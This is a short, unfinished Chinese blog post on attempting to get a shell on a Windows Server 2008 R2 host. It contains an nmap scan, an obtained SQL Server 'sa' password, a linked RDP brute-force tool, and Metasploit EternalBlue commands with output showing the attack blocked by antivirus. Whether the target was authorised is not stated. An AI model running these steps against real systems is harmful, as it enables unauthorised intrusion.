---
tags: [SQL Server,网络安全]
date: 2022-10-4 13:45
title: SQL Server 另类 getshell
---

## 待填坑

## 目标环境

Windows Server 2008 R2，安装了 360安全卫士，扫描结果大致如下：

```
80/tcp    open  http               Microsoft IIS httpd 7.5
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows Server 2008 R2 Enterprise 7600 microsoft-ds
1433/tcp  open  ms-sql-s           Microsoft SQL Server 2008 R2 10.50.1600.00; RTM
3389/tcp  open  ssl/ms-wbt-server?
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

其中运行于 1433 端口的 SQL Server 服务已经得到了账号与密码，即`sa:qwerty`

其中运行于 80 端口的 IIS 服务访问任何页面都是 404

## 尝试

### 远程桌面弱密码

用了[这个软件](https://github.com/7kbstorm/7kbscan-RDP-Sniper)跑，但其实根本没用——被 360 拦了

### 永恒之蓝

445 开着，那直接跑个永恒之蓝试试：

```
use exploit/windows/smb/ms17_010_eternalblue
set rhost 192.168.1.66
exploit
```

非常成功的——被拦了。

```
[+] 192.168.1.66:445 - The target is vulnerable.
[-] 192.168.1.66:445 - Errno::ECONNRESET: An existing connection was forcibly closed by the remote host.
```
